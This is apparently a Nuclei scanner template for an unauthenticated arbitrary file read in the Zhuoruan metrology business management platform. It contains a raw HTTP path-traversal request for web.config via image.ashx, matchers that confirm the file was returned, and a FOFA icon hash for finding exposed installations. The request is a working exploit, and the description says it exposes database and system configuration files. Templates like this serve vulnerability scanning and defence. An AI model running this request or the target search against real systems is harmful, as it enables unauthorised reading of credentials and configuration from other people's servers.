http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - <?xml version="1.0"
            - <configuration>
            - </configuration>
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /HuameiMeasure/image.ashx?image_path=./../web.config HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
          Accept-Encoding: gzip, deflate
          Connection: close
id: zhuoruan-image_ashx-File-reading
info:
    author: Superhero
    description: |-
        fofa: icon_hash="-334571363"
        卓软计量业务管理平台 image.ashx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 卓软计量业务管理平台 image.ashx 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/EwhiZQcp_3bgR-T2SU878Q?token=1386604809&lang=zh_CN
    severity: high
    tags:
        - File reading
